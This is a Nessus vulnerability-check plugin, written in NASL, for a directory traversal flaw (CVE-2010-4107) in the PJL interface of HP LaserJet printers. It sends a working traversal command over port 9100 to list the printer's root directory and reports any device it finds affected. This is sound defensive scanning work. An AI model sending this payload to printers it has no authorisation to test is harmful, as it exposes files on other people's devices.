#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69480);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2017/02/06 15:09:25 $");

  script_cve_id("CVE-2010-4107");
  script_bugtraq_id(44882);
  script_osvdb_id(69268);
  script_xref(name:"EDB-ID", value:"15631");
  script_xref(name:"EDB-ID", value:"32990");
  script_xref(name:"IAVB", value:"2011-B-0001");

  script_name(english:"HP LaserJet PJL Interface Directory Traversal (HPSBPI02575)");
  script_summary(english:"Tries to list the root directory.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host's PJL interface fails to sanitize input to the 'name'
parameter of the 'fsdirlist' command before using it.

An attacker can leverage this issue using a directory traversal
sequence to view arbitrary files on the affected host within the
context of the PJL service. Information harvested may aid in launching
further attacks.");
  script_set_attribute(attribute:"solution", value:
"Set a PJL password or disable file system access via the PJL
interface.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:TF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  # http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02004333
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?75a7707f");
  # http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2dce2a0f");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:hp:laserjet");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("pjl_detect.nasl");
  script_require_ports("Services/jetdirect", 9100);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

function pjl_send_recv(cmd, socket)
{
  local_var crlf, req, res, tag;

  tag = '\x1b%-12345X';
  crlf = '\r\n';

  req = tag + "@PJL " + cmd + crlf + tag + crlf;
  send(socket:socket, data:req);

  res = recv(socket:socket, length:1024);
  if (isnull(res))
    return NULL;

  return res;
}

# Find the ports that we expect to be able to talk to.
port = get_service(svc:"jetdirect", default:9100, exit_on_fail:TRUE);

# Setup the connection.
soc = open_sock_tcp(port);
if (!soc)
  audit(AUDIT_SOCK_FAIL, port, "TCP");

# Attempt the directory traversal.
path = "\..\..\..\";
cmd = 'FSDIRLIST NAME="0:' + path + '" ENTRY=1 COUNT=999999';
res = pjl_send_recv(socket:soc, cmd:cmd);
close(soc);

# Check if the response indicates that we were successful.
if (
  isnull(res) ||
  ".. TYPE=DIR" >!< res ||
  "etc TYPE=DIR" >!< res
) exit(0, "The PJL service listening on port " + port + " is unaffected.");

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  bar = crap(data:"-", length:30);
  bar = bar + " snip " + bar;

  res = str_replace(find:raw_string(0x0C), replace:'', string:res);
  res = str_replace(find:'\r', replace:'', string:res);
  res = str_replace(find:'\n', replace:'\n  ', string:res);
  res = chomp(res);

  report +=
    '\nNessus was able to retrieve a directory listing, seen in' +
    '\nthe response below :' +
    '\n' +
    '\n  ' + bar +
    '\n  ' + res +
    '\n  ' + bar +
    '\n';
}

security_hole(port:port, extra:report);
